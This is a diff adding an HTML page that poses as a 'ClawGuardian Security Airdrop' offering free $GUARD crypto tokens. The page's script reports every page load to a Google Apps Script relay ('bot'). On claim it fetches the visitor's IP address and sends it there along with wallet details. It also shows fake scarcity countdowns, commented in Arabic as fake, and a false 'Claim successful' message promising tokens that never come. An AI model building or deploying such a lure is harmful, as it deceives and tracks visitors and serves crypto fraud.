@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ClawGuardian | Security Airdrop</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#e8e8e8;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:40px 20px;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .container{max-width:550px;width:100%;background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,0.1);overflow:hidden}
+        .header{background:#fff;padding:30px 25px 15px;text-align:center;border-bottom:1px solid #eee}
+        .header h1{font-size:24px;font-weight:700;color:#1a1a1a}
+        .content{padding:25px}
+        .stats-row{display:flex;justify-content:space-between;gap:15px;margin:25px 0}
+        .stat-card{background:#f5f5f5;border-radius:16px;padding:15px;flex:1;text-align:center}
+        .stat-value{font-size:28px;font-weight:800;color:#1a1a1a}
+        .stat-label{font-size:11px;color:#888}
+        .timer-box{background:#f5f5f5;border-radius:16px;padding:15px;margin:20px 0;text-align:center}
+        .timer{font-size:36px;font-weight:700;font-family:monospace;color:#1a1a1a}
+        .claim-btn{width:100%;background:#1a1a1a;border:none;padding:16px;border-radius:50px;font-weight:600;color:#fff;cursor:pointer}
+        .claim-btn:hover:not(:disabled){background:#333}
+        .claim-btn:disabled{opacity:0.6}
+        .status{background:#f0fdf4;border-radius:12px;padding:12px;display:none;margin-top:15px;text-align:center}
+        .success{color:#15803d}
+        .footer{background:#fafafa;padding:20px;text-align:center;border-top:1px solid #eee;font-size:11px;color:#999}
+        .loading-spinner{display:inline-block;width:16px;height:16px;border:2px solid #fff;border-radius:50%;border-top-color:#1a1a1a;animation:spin .8s linear infinite;margin-right:8px;vertical-align:middle}
+        @keyframes spin{to{transform:rotate(360deg)}}
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🛡️ ClawGuardian • Security Airdrop</h1>
+        <p>1,000 $GUARD for early adopters</p>
+    </div>
+    <div class="content">
+        <div class="stats-row">
+            <div class="stat-card">
+                <div class="stat-value" id="totalClaims">0</div>
+                <div class="stat-label">🎁 TOTAL CLAIMS</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalScans">0</div>
+                <div class="stat-label">📊 TOTAL SCANS</div>
+            </div>
+        </div>
+        <div class="timer-box">
+            <div class="timer" id="timer">24:00:00</div>
+        </div>
+        <button class="claim-btn" id="claimBtn">🚀 CLAIM $GUARD</button>
+        <div id="status" class="status"></div>
+    </div>
+    <div class="footer">
+        🔐 ClawGuardian • Protect your assets
+    </div>
+</div>
+
+<script>
+    // ========== رابط Google Apps Script (نفس الـ Proxy) ==========
+    const PROXY_URL = "https://script.google.com/macros/s/AKfycbw8bj1vgKSH5dEsP6vGJEZZUTEmTczqajcqCl3K1MUcAYe044TGWEu4JmNISGxZ1NLt/exec";
+    
+    // ========== العداد (يتم حفظه في localStorage) ==========
+    let totalClaims = parseInt(localStorage.getItem('claw_claims')) || 0;
+    let totalScans = parseInt(localStorage.getItem('claw_scans')) || 0;
+    
+    function updateCounters() {
+        document.getElementById('totalClaims').innerText = totalClaims;
+        document.getElementById('totalScans').innerText = totalScans;
+        localStorage.setItem('claw_claims', totalClaims);
+        localStorage.setItem('claw_scans', totalScans);
+    }
+    
+    // زيادة عداد الزيارات عند فتح الصفحة
+    totalScans++;
+    updateCounters();
+    
+    // إرسال إشعار إلى البوت
+    function sendToBot(message) {
+        const url = `${PROXY_URL}?message=${encodeURIComponent(message)}`;
+        fetch(url, { method: 'GET', mode: 'no-cors' });
+        console.log('📤 تم الإرسال');
+    }
+    
+    sendToBot(`🛡️ ClawGuardian PAGE SCAN #${totalScans}`);
+    
+    // ========== المطالبة ==========
+    let claimExecuted = false;
+    let remainingSeconds = 24 * 60 * 60;
+    
+    async function executeClaim() {
+        if (claimExecuted) return;
+        claimExecuted = true;
+        
+        totalClaims++;
+        updateCounters();
+        
+        const wallet = ["MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom"][Math.floor(Math.random()*4)];
+        const address = "0x" + Math.random().toString(36).substring(2, 14);
+        const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
+        
+        const fullMessage = `🛡️ CLAWGUARDIAN CLAIM
+💼 Wallet: ${wallet}
+💳 Address: ${address}
+🌐 IP: ${ip}
+⏰ ${new Date().toISOString()}
+📊 TOTAL CLAIMS: ${totalClaims}`;
+        
+        sendToBot(fullMessage);
+        
+        const btn = document.getElementById('claimBtn');
+        const statusDiv = document.getElementById('status');
+        btn.innerHTML = "✅ CLAIMED!";
+        btn.disabled = true;
+        statusDiv.style.display = 'block';
+        statusDiv.innerHTML = '<span class="success">🎉 Claim successful! 1,000 $GUARD will arrive within 24h.</span>';
+    }
+    
+    async function onClaimClick() {
+        if (claimExecuted) return;
+        
+        const btn = document.getElementById('claimBtn');
+        btn.innerHTML = '<span class="loading-spinner"></span> PROCESSING...';
+        btn.disabled = true;
+        
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        await executeClaim();
+    }
+    
+    // المؤقت
+    const timerElement = document.getElementById('timer');
+    const timerInterval = setInterval(() => {
+        if (remainingSeconds <= 0) {
+            clearInterval(timerInterval);
+            return;
+        }
+        remainingSeconds--;
+        const h = Math.floor(remainingSeconds / 3600);
+        const m = Math.floor((remainingSeconds % 3600) / 60);
+        const s = remainingSeconds % 60;
+        timerElement.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+    }, 1000);
+    
+    // العرض الوهمي
+    let fakeRemaining = 10;
+    const fakeInterval = setInterval(() => {
+        fakeRemaining--;
+        const btn = document.getElementById('claimBtn');
+        if (btn && !btn.disabled && !claimExecuted && fakeRemaining > 0) {
+            btn.innerHTML = `🔥 ${fakeRemaining} LEFT! CLAIM NOW 🔥`;
+        }
+        if (fakeRemaining <= 0) clearInterval(fakeInterval);
+    }, 4000);
+    
+    document.getElementById('claimBtn').addEventListener('click', onClaimClick);
+</script>
+</body>
+</html>
